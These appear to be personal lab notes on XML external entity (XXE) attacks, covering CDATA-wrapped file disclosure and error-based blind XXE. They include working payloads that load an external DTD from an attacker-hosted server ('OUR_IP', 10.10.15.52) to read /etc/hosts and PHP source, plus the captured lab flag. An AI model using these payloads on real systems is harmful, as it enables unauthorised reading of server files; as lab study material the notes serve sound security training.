# Advanced File Disclosure

## Advanced Exfiltration with CDATA

If we wrap the content of the external file reference with a CDATA, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>

--> This will not work, since XML prevents joining internal and external entities

## Special entity using % in DTD

echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000

<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->

## Error Based XXE

If the application does not write any output : blind attack

Write a xxe.dtd file which contains :

<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

python3 -m http.server 8000


<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>

## LAB

http://10.129.31.16/error/

vi xxe.dtd

<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

python3 -m http.server 8000


<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.52:8000/xxe.dtd">
  %remote;
  %error;
]>


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.52:8000/xxe.dtd">
  %remote;
  %error;
]>
<root>
<name>a</name>
<tel></tel>
<email>a@test.com</email>
<message>a</message>
</root>

:  DOMDocument::loadXML(): Invalid URI: /&lt;?php $flag = &quot;HTB{3rr0r5_c4n_l34k_d474}&quot;; ?&gt; in Entity, line: 2 in <b>/var/www/html/error/submitDetails.php